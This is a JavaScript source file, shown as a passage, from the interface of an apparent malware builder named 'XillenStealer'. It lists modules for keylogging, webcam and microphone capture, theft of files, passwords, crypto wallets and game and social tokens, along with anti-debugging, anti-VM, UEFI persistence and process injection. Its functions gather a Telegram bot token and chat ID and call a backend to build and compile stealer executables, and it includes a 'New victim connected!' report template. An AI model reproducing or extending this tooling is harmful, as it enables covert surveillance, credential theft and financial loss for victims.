    'about.modules.security.antidebug.desc': 'Protects against debuggers and sandbox analysis, detects OllyDbg, x64dbg, IDA Pro, Ghidra, WinDbg, Process Hacker, Process Monitor, Wireshark, Fiddler, Burp Suite',
    'about.modules.security.antivm.desc': 'Detects virtual machines (VMware, VirtualBox, Hyper-V, QEMU, Parallels, Xen, KVM) and terminates execution',
    'about.modules.security.screenshot.desc': 'Takes high-quality screenshot of victim\'s screen',
    'about.modules.security.keylogger.desc': 'Records keystrokes in real-time',
    'about.modules.security.audio.desc': 'Records audio from victim\'s microphone',
    'about.modules.security.webcam.desc': 'Takes photo from victim\'s webcam',
    'about.modules.files.documents.desc': 'Steals files from Documents folder (PDF, DOC, DOCX, XLS, XLSX, PPT, PPTX, TXT, RTF)',
    'about.modules.files.desktop.desc': 'Extracts files from desktop',
    'about.modules.files.downloads.desc': 'Steals files from Downloads folder',
    'about.modules.files.system.desc': 'Collects system data, CPU, memory, graphics card, network adapters, installed programs',
    'about.modules.additional.fingerprint.desc': 'Детект браузерных отпечатков, сбор информации о браузере, плагинах, расширениях',
    'about.modules.additional.clipboard.desc': 'Перехват буфера обмена, мониторинг скопированного текста',
    'about.modules.additional.filesystem.desc': 'Мониторинг изменений файлов в реальном времени',
    'about.modules.additional.network.desc': 'Анализ сетевого трафика, перехват пакетов',
    'about.modules.additional.password.desc': 'Интеграция с менеджерами паролей (1Password, LastPass, Bitwarden, Dashlane, Keeper)',
    'about.modules.additional.social.desc': 'Токены соцсетей (Instagram, TikTok, Facebook, Twitter, LinkedIn, Snapchat)',
    'about.modules.additional.iot.desc': 'Сканирование IoT устройств в сети',
    'about.modules.additional.webrtc.desc': 'Сбор WebRTC данных для определения реального IP',
    'about.modules.games.steam.desc': 'Извлечение данных Steam аккаунта, игр, друзей',
    'about.modules.games.epic.desc': 'Данные Epic Games Launcher',
    'about.modules.games.minecraft.desc': 'Данные Minecraft аккаунта',
    'about.modules.games.origin.desc': 'Данные Origin (EA Games)',
    'about.modules.games.uplay.desc': 'Данные Uplay (Ubisoft)',
    'about.modules.games.battlenet.desc': 'Данные Battle.net (Blizzard)',
    'about.modules.technical.persistence.desc': 'Auto-start on system boot, system hiding',
    'about.modules.technical.uefi.desc': 'UEFI-level boot for maximum stealth',
    'about.modules.technical.inject.desc': 'Process injection for detection bypass',
    'about.modules.technical.gpu.desc': 'GPU usage for data processing',
    'about.modules.technical.ebpf.desc': 'System call interception via eBPF',
    'about.modules.technical.tpm.desc': 'Trusted Platform Module operation',
    'about.modules.technical.dma.desc': 'Direct memory access via DMA',
    'about.modules.technical.wifi.desc': 'Command channel via Wi-Fi',
    'about.modules.technical.proxy.desc': 'Cloud proxy usage for stealth',
    'about.modules.technical.kubernetes.desc': 'Kubernetes cluster operation',
    'about.modules.technical.docker.desc': 'Containerization and Docker operation'
  }
};

// Translation function
function t(key) {
  return translations[currentLanguage]?.[key] || translations['ru']?.[key] || key;
}

// Setup auth language selector immediately (before DOMContentLoaded)
(function() {
  const authLanguageSelect = document.getElementById('authLanguageSelect');
  if (authLanguageSelect) {
    authLanguageSelect.addEventListener('change', throttle((e) => {
      switchLanguage(e.target.value);
    }, 100));
    
    // Set initial value
    const savedLang = localStorage.getItem('language') || 'ru';
    authLanguageSelect.value = savedLang;
    currentLanguage = savedLang;
    updateUI();
  }
})();

function showNotification(type, title, message, duration = 5000) {
  const container = document.getElementById('notificationContainer');
  if (!container) return;
  
  const notification = document.createElement('div');
  notification.className = `notification ${type}`;
  notification.innerHTML = `
    <div class="notification-content">
      <div class="notification-title">${title}</div>
      <div class="notification-message">${message}</div>
    </div>
    <button class="notification-close">&times;</button>
  `;
  
  container.appendChild(notification);
  
  // Auto remove
  setTimeout(() => {
    if (notification.parentNode) {
      notification.parentNode.removeChild(notification);
    }
  }, duration);
  
  // Manual close
  notification.querySelector('.notification-close').addEventListener('click', () => {
    if (notification.parentNode) {
      notification.parentNode.removeChild(notification);
    }
  });
}

function log(message) {
  const logContainer = document.getElementById('logContainer');
  if (!logContainer) return;
  
  const logEntry = document.createElement('div');
  logEntry.className = 'log-entry';
  logEntry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
  
  logContainer.appendChild(logEntry);
  logContainer.scrollTop = logContainer.scrollHeight;
}

// FAQ Search functionality
function setupFaqSearch() {
  const searchInput = document.getElementById('faqSearch');
  const clearBtn = document.getElementById('clearSearch');
  const faqContent = document.getElementById('modulesFaqContent');
  
  if (!searchInput || !clearBtn || !faqContent) return;
  
  let searchTimeout;
  
  searchInput.addEventListener('input', (e) => {
    clearTimeout(searchTimeout);
    searchTimeout = setTimeout(() => {
      performFaqSearch(e.target.value);
    }, 150);
  });
  
  clearBtn.addEventListener('click', () => {
    searchInput.value = '';
    clearBtn.style.display = 'none';
    performFaqSearch('');
  });
  
  searchInput.addEventListener('input', (e) => {
    clearBtn.style.display = e.target.value ? 'block' : 'none';
  });
}

function performFaqSearch(query) {
  const faqContent = document.getElementById('modulesFaqContent');
  if (!faqContent) return;
  
  const categories = faqContent.querySelectorAll('.faq-category');
  const modules = faqContent.querySelectorAll('.faq-module');
  
  if (!query.trim()) {
    // Show all when search is empty
    categories.forEach(cat => {
      cat.classList.remove('hidden');
      cat.querySelectorAll('.faq-module').forEach(mod => {
        mod.classList.remove('hidden');
        removeHighlights(mod);
      });
    });
    return;
  }
  
  const searchTerm = query.toLowerCase();
  let hasVisibleResults = false;
  
  categories.forEach(category => {
    const categoryTitle = category.querySelector('h3').textContent.toLowerCase();
    const categoryModules = category.querySelectorAll('.faq-module');
    let categoryHasVisibleModules = false;
    
    categoryModules.forEach(module => {
      const moduleTitle = module.querySelector('h4').textContent.toLowerCase();
      const moduleDesc = module.querySelector('p').textContent.toLowerCase();
      
      if (moduleTitle.includes(searchTerm) || moduleDesc.includes(searchTerm)) {
        module.classList.remove('hidden');
        categoryHasVisibleModules = true;
        hasVisibleResults = true;
        
        // Highlight search term
        highlightSearchTerm(module, query);
      } else {
        module.classList.add('hidden');
        removeHighlights(module);
      }
    });
    
    // Show/hide category based on visible modules
    if (categoryHasVisibleModules || categoryTitle.includes(searchTerm)) {
      category.classList.remove('hidden');
      if (categoryTitle.includes(searchTerm)) {
        highlightSearchTerm(category.querySelector('h3'), query);
      }
    } else {
      category.classList.add('hidden');
    }
  });
  
  // Show "No results" message if needed
  showNoResultsMessage(!hasVisibleResults);
}

function highlightSearchTerm(element, query) {
  const text = element.textContent;
  const regex = new RegExp(`(${query})`, 'gi');
  const highlightedText = text.replace(regex, '<span class="search-highlight">$1</span>');
  
  if (highlightedText !== text) {
    element.innerHTML = highlightedText;
  }
}

function removeHighlights(element) {
  const highlights = element.querySelectorAll('.search-highlight');
  highlights.forEach(highlight => {
    highlight.outerHTML = highlight.textContent;
  });
}

function showNoResultsMessage(show) {
  let noResultsMsg = document.getElementById('noResultsMsg');
  
  if (show && !noResultsMsg) {
    noResultsMsg = document.createElement('div');
    noResultsMsg.id = 'noResultsMsg';
    noResultsMsg.className = 'no-results';
    noResultsMsg.innerHTML = `
      <div class="no-results-content">
        <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-6h2v6zm0-8h-2V7h2v2z"/></svg>
        <h3>Ничего не найдено</h3>
        <p>Попробуйте изменить поисковый запрос</p>
      </div>
    `;
    
    const faqContent = document.getElementById('modulesFaqContent');
    faqContent.appendChild(noResultsMsg);
  } else if (!show && noResultsMsg) {
    noResultsMsg.remove();
  }
}

// Telegram preview templates
const telegramTemplates = {
  ru: {
    header: "🎯 <strong>Новая жертва подключена!</strong><br>",
    ip: "📍 <strong>IP:</strong> 192.168.1.100<br>",
    country: "🌍 <strong>Страна:</strong> Россия<br>",
    os: "💻 <strong>ОС:</strong> Windows 11<br>",
    time: "🕐 <strong>Время:</strong> 25.10.2025 12:34:56<br><br>",
    data: "📊 <strong>Собранные данные:</strong><br>",
    browsers: "• Браузеры: Chrome, Firefox<br>",
    passwords: "• Пароли: 15 сохраненных<br>",
    wallets: "• Крипто-кошельки: MetaMask<br>",
    screenshot: "• Скриншот: ✅<br>",
    system: "• Системная информация: ✅"
  },
  en: {
    header: "🎯 <strong>New victim connected!</strong><br>",
    ip: "📍 <strong>IP:</strong> 192.168.1.100<br>",
    country: "🌍 <strong>Country:</strong> Russia<br>",
    os: "💻 <strong>OS:</strong> Windows 11<br>",
    time: "🕐 <strong>Time:</strong> 25.10.2025 12:34:56<br><br>",
    data: "📊 <strong>Collected data:</strong><br>",
    browsers: "• Browsers: Chrome, Firefox<br>",
    passwords: "• Passwords: 15 saved<br>",
    wallets: "• Crypto wallets: MetaMask<br>",
    screenshot: "• Screenshot: ✅<br>",
    system: "• System information: ✅"
  }
};

function setupTelegramPreview() {
  const telegramSelect = document.getElementById('telegramLanguageSelect');
  if (telegramSelect) {
    telegramSelect.addEventListener('change', throttle(() => {
      updateTelegramPreview();
      // Save selection
      localStorage.setItem('telegramLanguage', telegramSelect.value);
    }, 100));
    // Initialize with saved value or default
    const savedLang = localStorage.getItem('telegramLanguage') || 'ru';
    telegramSelect.value = savedLang;
    updateTelegramPreview();
  }
}

function updateTelegramPreview() {
  const telegramLang = document.getElementById('telegramLanguageSelect')?.value || 'ru';
  const content = document.getElementById('telegramContent');
  if (!content) return;
  
  const template = telegramTemplates[telegramLang];
  if (!template) return;
  
  content.innerHTML = 
    template.header +
    template.ip +
    template.country +
    template.os +
    template.time +
    template.data +
    template.browsers +
    template.passwords +
    template.wallets +
    template.screenshot +
    template.system;
}

function buildStealer() {
  const name = document.getElementById('stealerName').value;
  const token = document.getElementById('botToken').value;
  const chatId = document.getElementById('chatId').value;
  const sleepTime = parseInt(document.getElementById('sleepTime').value);
  const chunkSize = parseInt(document.getElementById('chunkSize').value);
  const telegramLanguage = document.getElementById('telegramLanguageSelect').value;
  
  const modules = getModuleStates();
  
  if (!name || !token || !chatId) {
    showNotification('error', 'Ошибка', 'Заполните все обязательные поля');
    return;
  }
  
  const config = {
    name,
    token,
    chat_id: chatId,
    sleep_time: sleepTime,
    chunk_size: chunkSize,
    telegram_language: telegramLanguage,
    modules
  };
  
  showNotification('info', 'Сборка', 'Начинаем сборку стиллера...');
  
  // Send config to backend
  window.xillen.startBackend(config);
}

async function buildCppV5() {
  showNotification('info', 'Сборка V5 C++', 'Начинаем сборку XillenStealer V5...');
  
  try {
    const result = await window.xillen.compileCppV5();
    
    if (result.status === 'ok') {
      showNotification('success', 'Успех', 'V5 успешно собран!');
      console.log('Build output:', result.output);
    } else {
      showNotification('error', 'Ошибка', 'Ошибка при сборке V5: ' + result.output.join('\n'));
    }
  } catch (error) {
    showNotification('error', 'Ошибка', 'Ошибка: ' + error.message);
  }
}

function resetForm() {
  document.getElementById('stealerName').value = 'XillenStealer';
  document.getElementById('botToken').value = '';
  document.getElementById('chatId').value = '';
  document.getElementById('sleepTime').value = '5';
  document.getElementById('chunkSize').value = '1048576';
  
  // Reset modules to default state
  document.querySelectorAll('.module-item').forEach(item => {
    const checkbox = item.querySelector('.module-check');
    const key = item.dataset.module;
    const defaultModules = ['browsers', 'wallets', 'system_info', 'screenshot', 'anti_debug', 'anti_vm', 'persistence', 'totp', 'webrtc', 'payment_systems'];
    checkbox.classList.toggle('active', defaultModules.includes(key));
  });
  
  showNotification('success', 'Сброс', 'Форма сброшена к значениям по умолчанию');
}

function switchLanguage(lang) {
  currentLanguage = lang;
  localStorage.setItem('language', lang);
  updateUI();
}

function updateUI() {
  document.querySelectorAll('[data-translate]').forEach(el => {
    const key = el.getAttribute('data-translate');
    const translation = t(key);
    if (translation && translation !== key) {
      el.textContent = translation;
    }
  });
  
  // Update language selector if it exists
  const languageSelect = document.getElementById('languageSelect');
  if (languageSelect) {
    languageSelect.value = currentLanguage;
  }
  
  // Update placeholder attributes
  document.querySelectorAll('[data-translate-placeholder]').forEach(el => {
    const key = el.getAttribute('data-translate-placeholder');
    const translation = t(key);
    if (translation && translation !== key) {
      el.placeholder = translation;
    }
  });
  
  // Update About section content dynamically
  updateAboutSection();
}

function updateAboutSection() {
  // Update module descriptions in About section
  const aboutSection = document.querySelector('.about-content');
  if (!aboutSection) return;
  
  // Update all module items with translations
  const moduleItems = aboutSection.querySelectorAll('.module-item');
  moduleItems.forEach(item => {
    const strong = item.querySelector('strong');
    if (strong && strong.hasAttribute('data-translate')) {
      const key = strong.getAttribute('data-translate');
      const translation = t(key);
      if (translation && translation !== key) {
        strong.textContent = translation;
      }
    }
  });
}

const modules = [
  { key: 'browsers', name: 'Сбор браузеров', default: true },
  { key: 'wallets', name: 'Крипто-кошельки', default: true },
  { key: 'system_info', name: 'Системная информация', default: true },
  { key: 'screenshot', name: 'Скриншот экрана', default: true },
  { key: 'audio_record', name: 'Запись звука', default: false },
  { key: 'keylogger', name: 'Логи клавиатуры', default: false },
  { key: 'anti_debug', name: 'Анти-отладка', default: true },
  { key: 'anti_vm', name: 'Анти-VM', default: true },
  { key: 'persistence', name: 'Персистентность', default: true },
  { key: 'uefi', name: 'UEFI руткит', default: false },
  { key: 'process_inject', name: 'Инжект в процессы', default: false },
  { key: 'gpu_memory', name: 'GPU память', default: false },
  { key: 'ebpf', name: 'eBPF хуки', default: false },
  { key: 'tpm', name: 'TPM модуль', default: false },
  { key: 'dma', name: 'DMA атаки', default: false },
  { key: 'wifi_c2', name: 'Wi-Fi C2', default: false },
  { key: 'cloud_proxy', name: 'Облачный прокси', default: false },
  { key: 'kubernetes', name: 'Kubernetes', default: false },
  { key: 'docker', name: 'Docker', default: false },
  { key: 'iot', name: 'IoT сканер', default: false },
  { key: 'totp', name: 'Сбор TOTP', default: true },
  { key: 'biometric', name: 'Биометрические данные', default: false },
  { key: 'webrtc', name: 'WebRTC данные', default: true },
  { key: 'payment', name: 'Платежные системы', default: true },
  { key: 'browser_fingerprint', name: 'Отпечатки браузера', default: true },
  { key: 'clipboard_monitor', name: 'Мониторинг буфера', default: true },
  { key: 'file_watcher', name: 'Мониторинг файлов', default: true },
  { key: 'network_analyzer', name: 'Анализ трафика', default: true },
  { key: 'password_managers', name: 'Менеджеры паролей', default: true },
  { key: 'social_tokens', name: 'Соцсети токены', default: true },
  { key: 'linpeas', name: 'LinPEAS сканер', default: true }
];

function showNotification(type, title, message, duration = 5000) {
  const container = document.getElementById('notificationContainer');
  const notification = document.createElement('div');
  notification.className = `notification ${type}`;
  
  notification.innerHTML = `
    <div class="notification-title">${title}</div>
    <div class="notification-message">${message}</div>
  `;
  
  container.appendChild(notification);
  
  if (duration > 0) {
    setTimeout(() => {
      notification.remove();
    }, duration);
  }
  
  return notification;
}

function log(message) {
  const logArea = document.getElementById('buildLog');
  if (logArea) {
    logArea.value += `> ${message}\n`;
    logArea.scrollTop = logArea.scrollHeight;
  }
}

function updateStatus(message) {
  const statusText = document.getElementById('statusText');
  if (statusText) {
    statusText.textContent = message;
  }
}

function createRainDrop() {
  const rainContainer = document.getElementById('rainContainer');
  if (!rainContainer) return;
  
  // Limit number of drops for better performance
  if (rainContainer.children.length > 15) {
    const firstDrop = rainContainer.firstChild;
    if (firstDrop) {
      rainContainer.removeChild(firstDrop);
    }
  }
  
  const drop = document.createElement('div');
  drop.className = 'rain-drop';
  drop.style.left = Math.random() * 100 + '%';
  drop.style.height = (Math.random() * 20 + 40) + 'px'; // Smaller drops
  drop.style.animationDuration = (Math.random() * 1 + 2) + 's'; // Faster animation
  drop.style.opacity = Math.random() * 0.3 + 0.2; // More transparent
  rainContainer.appendChild(drop);
  
  setTimeout(() => {
    if (drop.parentNode) {
      drop.parentNode.removeChild(drop);
    }
  }, 3000); // Shorter timeout
}

function startRain() {
  if (animationFrameId) return;
  
  let lastDropTime = 0;
  const DROP_INTERVAL = 150; // Slower drops for better performance
  
  function rainLoop() {
    const now = Date.now();
    if (now - lastDropTime >= DROP_INTERVAL) {
      createRainDrop();
      lastDropTime = now;
    }
    animationFrameId = requestAnimationFrame(rainLoop);
  }
  
  animationFrameId = requestAnimationFrame(rainLoop);
}

function stopRain() {
  if (animationFrameId) {
    cancelAnimationFrame(animationFrameId);
    animationFrameId = null;
  }
  const rainContainer = document.getElementById('rainContainer');
  if (rainContainer) {
    rainContainer.innerHTML = '';
  }
}

function toggleRain() {
  isRainEnabled = !isRainEnabled;
  const toggle = document.getElementById('rainToggle');
  if (toggle) {
    toggle.textContent = isRainEnabled ? 'Вкл' : 'Выкл';
    toggle.className = `btn toggle ${isRainEnabled ? 'on' : 'off'}`;
  }
  
  if (isRainEnabled) {
    startRain();
  } else {
    stopRain();
  }
}

function switchTheme(theme) {
  currentTheme = theme;
  
  if (theme === 'scarlet') {
    document.body.className = 'theme-scarlet';
  } else if (theme === 'light') {
    document.body.className = 'theme-light';
  } else {
    document.body.className = '';
  }
  
  const deepDarkBtn = document.getElementById('themeDeepDark');
  const scarletBtn = document.getElementById('themeScarlet');
  const lightBtn = document.getElementById('themeLight');
  
  if (deepDarkBtn && scarletBtn && lightBtn) {
    deepDarkBtn.classList.toggle('active', theme === 'deep_dark');
    scarletBtn.classList.toggle('active', theme === 'scarlet');
    lightBtn.classList.toggle('active', theme === 'light');
  }
}

function selectAllModules() {
  const moduleItems = document.querySelectorAll('.module-item');
  moduleItems.forEach(item => {
    item.classList.add('active');
    const status = item.querySelector('.module-status');
    status.textContent = t('module.enabled');
  });
}

function deselectAllModules() {
  const moduleItems = document.querySelectorAll('.module-item');
  moduleItems.forEach(item => {
    item.classList.remove('active');
    const status = item.querySelector('.module-status');
    status.textContent = t('module.disabled');
  });
}

function populateModules() {
  const modulesGrid = document.getElementById('modulesGrid');
  if (!modulesGrid) return;
  
  modulesGrid.innerHTML = '';
  
  const moduleControls = document.createElement('div');
  moduleControls.className = 'module-controls';
  moduleControls.innerHTML = `
    <button class="btn-select-all" onclick="selectAllModules()">
      <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor">
        <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/>
      </svg>
      ${t('module.select_all')}
    </button>
    <button class="btn-deselect-all" onclick="deselectAllModules()">
      <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor">
        <path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/>
      </svg>
      ${t('module.deselect_all')}
    </button>
  `;
  modulesGrid.appendChild(moduleControls);
  
  // Use requestAnimationFrame for smooth rendering
  requestAnimationFrame(() => {
    modules.forEach(module => {
    const moduleItem = document.createElement('div');
    moduleItem.className = `module-item ${module.default ? 'active' : ''}`;
    moduleItem.dataset.key = module.key;
    
    moduleItem.innerHTML = `
      <div class="module-icon">
        <svg viewBox="0 0 24 24">
          <path d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"/>
        </svg>
      </div>
      <div class="module-content">
        <div class="module-name" data-translate="module.${module.key}">${module.name}</div>
        <div class="module-status">${module.default ? t('module.enabled') : t('module.disabled')}</div>
      </div>
    `;
    
    moduleItem.addEventListener('click', () => {
      moduleItem.classList.toggle('active');
      const status = moduleItem.querySelector('.module-status');
      if (moduleItem.classList.contains('active')) {
        status.textContent = t('module.enabled');
      } else {
        status.textContent = t('module.disabled');
      }
    });
    
    modulesGrid.appendChild(moduleItem);
    });
  });
}

function getModuleStates() {
  const states = {};
  const moduleItems = document.querySelectorAll('.module-item');
  
  moduleItems.forEach(item => {
    const key = item.dataset.key;
    states[key] = item.classList.contains('active');
  });
  
  return states;
}

async function createStealer() {
  const name = document.getElementById('stealerName').value.trim() || 'XillenStealer';
  const token = document.getElementById('botToken').value.trim();
  const chatId = document.getElementById('chatId').value.trim();
  const sleepTime = document.getElementById('sleepTime').value || '5';
  const chunkSize = document.getElementById('chunkSize').value || '1048576';
  
  // Get icon file path
  const iconFile = document.getElementById('exeIcon').files[0];
  let iconPath = null;
  if (iconFile) {
    iconPath = iconFile.path;
  }
  
  if (!token || !chatId) {
    showNotification('error', 'Ошибка', 'Заполните токен и ID чата!');
    return;
  }
  
  const config = {
    name,
    token,
    chat_id: chatId,
    sleep_time: parseInt(sleepTime),
    chunk_size: parseInt(chunkSize),
    modules: getModuleStates(),
    icon_path: iconPath
  };
  
  updateStatus('Создание стиллера...');
  log(`Создание стиллера: ${name}`);
  
  try {
    const result = await window.xillen.buildStealer(config);
    
    if (result.status === 'ok') {
      log(`<svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg> Стиллер создан: ${name}.py`);
      updateStatus('Стиллер создан успешно');
      showNotification('success', 'Успешно', `Стиллер ${name}.py создан!`);
      
      showCompileDialog(result.path, name);
    } else {
      log(`<svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor"><path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg> Ошибка: ${result.message}`);
      updateStatus('Ошибка создания');
      showNotification('error', 'Ошибка', result.message);
    }
  } catch (error) {
    log(`<svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor"><path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg> Критическая ошибка: ${error.message}`);
    updateStatus('Критическая ошибка');
    showNotification('error', 'Ошибка', error.message);
  }
}

function showCompileDialog(pyPath, name) {
  const dialog = document.createElement('div');
  dialog.className = 'compile-dialog-overlay';
  dialog.innerHTML = `
    <div class="compile-dialog">
      <div class="dialog-header">
        <h3>Собрать в EXE?</h3>
        <button class="dialog-close">&times;</button>
      </div>
      <div class="dialog-content">
        <p>Стиллер <strong>${name}.py</strong> создан успешно!</p>
        <p>Хотите скомпилировать его в исполняемый файл <strong>${name}.exe</strong>?</p>
        <div class="dialog-info">
          <div class="info-item">
            <svg class="info-icon" width="16" height="16" viewBox="0 0 24 24" fill="currentColor">
              <path d="M12 2C6.5 2 2 6.5 2 12s4.5 10 10 10 10-4.5 10-10S17.5 2 12 2zm0 18c-4.4 0-8-3.6-8-8s3.6-8 8-8 8 3.6 8 8-3.6 8-8 8zm.5-13H11v6l5.25 3.15.75-1.23-4.5-2.67V7z"/>
            </svg>
            <span>Время компиляции: 2-5 минут</span>
          </div>
          <div class="info-item">
            <svg class="info-icon" width="16" height="16" viewBox="0 0 24 24" fill="currentColor">
              <path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"/>
            </svg>
            <span>Размер файла: ~50-100 MB</span>
          </div>
          <div class="info-item">
            <svg class="info-icon" width="16" height="16" viewBox="0 0 24 24" fill="currentColor">
              <path d="M22.7 19l-9.1-9.1c.9-2.3.4-5-1.5-6.9-2-2-5-2.4-7.4-1.3L9 6 6 9 1.6 4.7C.4 7.1.9 10.1 2.9 12.1c1.9 1.9 4.6 2.4 6.9 1.5l9.1 9.1c.4.4 1 .4 1.4 0l2.3-2.3c.5-.4.5-1.1.1-1.4z"/>
            </svg>
            <span>Требуется PyInstaller</span>
          </div>
        </div>
      </div>
      <div class="dialog-actions">
        <button class="btn primary" id="compileYes">
          <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor">
            <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/>
          </svg>
          Да, собрать
        </button>
        <button class="btn" id="compileNo">
          <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor">
            <path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/>
          </svg>
          Нет, только .py
        </button>
      </div>
    </div>
  `;
  
  document.body.appendChild(dialog);
  
  dialog.querySelector('.dialog-close').addEventListener('click', () => {
    dialog.remove();
  });
  
  dialog.querySelector('#compileYes').addEventListener('click', () => {
    dialog.remove();
    compileToExe(pyPath, name);
  });
  
  dialog.querySelector('#compileNo').addEventListener('click', () => {
    dialog.remove();
    showNotification('info', 'Готово', 'Стиллер создан без компиляции');
  });
  
  dialog.addEventListener('click', (e) => {
    if (e.target === dialog) {
      dialog.remove();
    }
  });
}

async function compileToExe(pyPath, name) {
  const progressContainer = document.getElementById('progressContainer');
  const progressFill = document.getElementById('progressFill');
  const progressText = document.getElementById('progressText');
  const progressPercent = document.getElementById('progressPercent');
  
  progressContainer.style.display = 'block';
  progressFill.style.width = '0%';
  progressPercent.textContent = '0%';
  progressText.textContent = 'Подготовка к компиляции...';
  
  const steps = ['step1', 'step2', 'step3', 'step4'];
  steps.forEach(step => {
    document.getElementById(step).classList.remove('active', 'completed');
  });
  document.getElementById('step1').classList.add('active');
  
  updateStatus('Компиляция в EXE...');
  log(`Компиляция ${name}.exe...`);
  
  let progress = 0;
  let currentStep = 0;
  const progressInterval = setInterval(() => {
    progress += Math.random() * 8;
    if (progress > 95) progress = 95;
    progressFill.style.width = progress + '%';
    progressPercent.textContent = Math.round(progress) + '%';
    
    if (progress < 25 && currentStep === 0) {
      progressText.textContent = 'Анализ зависимостей...';
      document.getElementById('step1').classList.add('completed');
      document.getElementById('step2').classList.add('active');
      currentStep = 1;
    } else if (progress < 50 && currentStep === 1) {
      progressText.textContent = 'Сборка исполняемого файла...';
      document.getElementById('step2').classList.add('completed');
      document.getElementById('step3').classList.add('active');
      currentStep = 2;
    } else if (progress < 75 && currentStep === 2) {
      progressText.textContent = 'Оптимизация и упаковка...';
      document.getElementById('step3').classList.add('completed');
      document.getElementById('step4').classList.add('active');
      currentStep = 3;
    } else if (progress < 95 && currentStep === 3) {
      progressText.textContent = 'Финальная проверка...';
    }
  }, 200);
  
  try {
    const result = await window.xillen.compileExe(pyPath, name);
    
    clearInterval(progressInterval);
    progressFill.style.width = '100%';
    progressPercent.textContent = '100%';
    progressText.textContent = 'Завершено!';
    
    steps.forEach(step => {
      document.getElementById(step).classList.add('completed');
      document.getElementById(step).classList.remove('active');
    });
    
    setTimeout(() => {
      progressContainer.style.display = 'none';
    }, 2000);
    
    if (result.status === 'ok') {
      log(`<svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg> Успешно: ${name}.exe создан!`);
      updateStatus('Компиляция завершена');
      showNotification('success', 'Успешно', `Файл ${name}.exe создан!`);
    } else {
      log(`<svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor"><path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg> Ошибка компиляции!`);
      updateStatus('Ошибка компиляции');
      showNotification('error', 'Ошибка', 'Ошибка компиляции');
    }
  } catch (error) {
    clearInterval(progressInterval);
    progressContainer.style.display = 'none';
    log(`<svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor"><path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg> Ошибка компиляции: ${error.message}`);
    updateStatus('Ошибка компиляции');
    showNotification('error', 'Ошибка', error.message);
  }
}

async function loadBuilds() {
  try {
    const result = await window.xillen.getBuilds();
    const builds = result.builds || [];
    
    const buildsList = document.getElementById('buildsList');
    if (buildsList) {
      buildsList.innerHTML = '';
      
      if (builds.length === 0) {
        buildsList.innerHTML = '<p style="text-align: center; color: var(--muted);">Нет созданных сборок</p>';
        return;
      }
      
      builds.forEach(build => {
        const buildItem = document.createElement('div');
        buildItem.className = 'build-item';
        
        const sizeMB = (build.size / (1024 * 1024)).toFixed(2);
        const createdDate = new Date(build.created * 1000).toLocaleString();
        
        buildItem.innerHTML = `
          <div class="build-info">
            <div class="build-name">${build.name}</div>
            <div class="build-details">${sizeMB} MB • ${createdDate}</div>
          </div>
          <div class="build-type ${build.type}">${build.type.toUpperCase()}</div>
        `;
        
        buildsList.appendChild(buildItem);
      });
    }
    
    const stats = await window.xillen.getStats();
    updateBuildsStats(stats.stats || {});
    
  } catch (error) {
    console.error('Error loading builds:', error);
  }
}

function updateBuildsStats(stats) {
  const statsContainer = document.getElementById('buildsStats');
  if (!statsContainer) return;
  
  statsContainer.innerHTML = `
    <div class="stat-card">
      <div class="number">${stats.total_builds || 0}</div>
      <div class="label" data-translate="builds.total">Всего сборок</div>
    </div>
    <div class="stat-card">
      <div class="number">${stats.total_size_mb || 0}</div>
      <div class="label">MB</div>
    </div>
    <div class="stat-card">
      <div class="number">${stats.py_files || 0}</div>
      <div class="label" data-translate="builds.python">Python файлы</div>
    </div>
    <div class="stat-card">
      <div class="number">${stats.exe_files || 0}</div>
      <div class="label" data-translate="builds.exe">EXE файлы</div>
    </div>
  `;
  
  // Update translations for dynamically created elements
  updateUI();
}

function resetForm() {
  document.getElementById('stealerName').value = 'XillenStealer';
  document.getElementById('botToken').value = '';
  document.getElementById('chatId').value = '';
  document.getElementById('sleepTime').value = '5';
  document.getElementById('chunkSize').value = '1048576';
  
  const moduleItems = document.querySelectorAll('.module-item');
  moduleItems.forEach((item, index) => {
    const module = modules[index];
    if (module) {
      if (module.default) {
        item.classList.add('active');
        item.querySelector('.module-status').textContent = 'Включен';
      } else {
        item.classList.remove('active');
        item.querySelector('.module-status').textContent = 'Выключен';
      }
    }
  });
  
  document.getElementById('buildLog').value = '';
  updateStatus('Готов к работе');
}

async function checkPassword() {
  const password = document.getElementById('passwordInput').value;
  
  if (!password) {
    showNotification('error', 'Ошибка', 'Введите пароль!');
    return;
  }
  
  try {
